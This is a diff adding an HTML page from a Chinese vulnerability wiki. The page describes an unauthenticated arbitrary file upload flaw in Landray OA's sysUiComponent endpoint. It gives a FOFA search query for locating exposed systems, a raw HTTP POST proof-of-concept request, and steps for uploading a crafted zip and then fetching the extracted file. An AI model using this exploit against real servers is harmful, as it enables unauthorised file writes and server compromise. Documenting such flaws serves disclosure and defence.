@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E8%93%9D%E5%87%8Coa/%E8%93%9D%E5%87%8COAsysUiComponent-%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>蓝凌OAsysUiComponent 文件存在任意文件上传漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u84dd\u51ccOAsysUiComponent \u6587\u4ef6\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "fofa", url: "#fofa", children: [
+          ]},
+          {title: "poc", url: "#poc", children: [
+          ]},
+          {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_1", children: [
+          ]},
+          {title: "\u6f0f\u6d1e\u6765\u6e90", url: "#_2", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E8%93%9D%E5%A4%A9%E9%87%87%E9%9B%86%E5%99%A8/%E8%93%9D%E5%A4%A9%E9%87%87%E9%9B%86%E5%99%A8%20v2.3.1%20%E5%90%8E%E5%8F%B0getshell/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E8%93%9D%E5%A4%A9%E9%87%87%E9%9B%86%E5%99%A8/%E8%93%9D%E5%A4%A9%E9%87%87%E9%9B%86%E5%99%A8%20v2.3.1%20%E5%90%8E%E5%8F%B0getshell/" class="btn btn-xs btn-link">
+        蓝天采集器 v2.3.1 后台getshell
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E8%93%9D%E5%87%8COAsysUiComponent%20%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E8%93%9D%E5%87%8COAsysUiComponent%20%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        蓝凌OAsysUiComponent 文件存在任意文件上传漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="oasysuicomponent">蓝凌OAsysUiComponent 文件存在任意文件上传漏洞<a class="headerlink" href="#oasysuicomponent" title="Permanent link">&para;</a></h2>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>app=&quot;Landray-OA系统&quot;
+</code></pre></div>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<p>直接访问路径，发现未授权文件上传 http://.com/sys/ui/sys_ui_component/sysUiComponent.do?method=upload
+<img alt="c9857f5370d4abd1547fa7cb1988a18a" src="https://github.com/wy876/POC/assets/139549762/ee361dae-cfa2-4eae-910f-501331731347" /></p>
+<div class="highlight"><pre><span></span><code>POST /sys/ui/sys_ui_component/sysUiComponent.do?method=getThemeInfo&amp;s_ajax=true HTTP/1.1
+Host: IP:PORT
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Referer: http://.com/sys/ui/sys_ui_component/sysUiComponent.do?method=upload
+Content-Length: 474
+Content-Type: multipart/form-data; boundary=---------------------------15610248407689
+Cookie: SESSION=YmI0OGMyZDQtZDE0NC00MTQ2LWJmMzMtNWE5NDMwOTYxM2Ex
+DNT: 1
+Connection: close
+
+-----------------------------15610248407689
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.zip&quot;
+Content-Type: application/x-zip-compressed
+
+PKx3;x4;x14;
+-----------------------------15610248407689
+</code></pre></div>
+<h2 id="_1">漏洞复现<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>创建component.ini文件，内容为：
+<div class="highlight"><pre><span></span><code>id=2023
+name=check.txt
+</code></pre></div>
+创建上传check.txt文件
+<div class="highlight"><pre><span></span><code>1111
+</code></pre></div>
+然后使用压缩软件，将两个文件压缩成一个压缩包，文件名check.zip</p>
+<p>最后上传即可。上传成功后访问路径/resource/ui-component/2023/check.txt</p>
+<h2 id="_2">漏洞来源<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>https://mp.weixin.qq.com/s/xhwmFuItG8ZoiuGrwR5bnw
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E8%93%9D%E5%A4%A9%E9%87%87%E9%9B%86%E5%99%A8/%E8%93%9D%E5%A4%A9%E9%87%87%E9%9B%86%E5%99%A8%20v2.3.1%20%E5%90%8E%E5%8F%B0getshell/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E8%93%9D%E5%A4%A9%E9%87%87%E9%9B%86%E5%99%A8/%E8%93%9D%E5%A4%A9%E9%87%87%E9%9B%86%E5%99%A8%20v2.3.1%20%E5%90%8E%E5%8F%B0getshell/" class="btn btn-xs btn-link">
+        蓝天采集器 v2.3.1 后台getshell
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E8%93%9D%E5%87%8COAsysUiComponent%20%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E8%93%9D%E5%87%8COAsysUiComponent%20%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        蓝凌OAsysUiComponent 文件存在任意文件上传漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
